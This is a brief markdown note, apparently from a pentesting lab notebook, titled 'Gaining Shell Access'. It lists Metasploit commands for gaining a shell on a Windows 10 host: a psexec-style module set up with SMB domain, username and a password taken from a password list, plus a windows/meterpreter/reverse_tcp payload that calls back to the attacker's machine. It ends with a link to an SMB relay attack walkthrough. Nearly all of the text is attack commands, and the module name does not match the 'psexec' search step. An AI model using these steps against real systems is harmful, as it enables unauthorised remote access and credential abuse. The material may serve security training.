# Gaining Shell Access

become root and run metasploit using msfconsole then enter command "Search psexec" then enter command "use 10" (exploit/windows/local/wmi)&#x20;

enter the commands&#x20;

set rhosts Win10\_IP\_Address

set smbdomain EHP.com

set smbpass \*\*\*\*          (Use password list or the actual password)

set smbuser USERNAME&#x20;

set payload windows/meterpreter/reverse\_tcp&#x20;

set lhost wlan0





{% embed url="https://www.linkedin.com/pulse/smb-relay-attack-walkthrough-david-pilat" %}
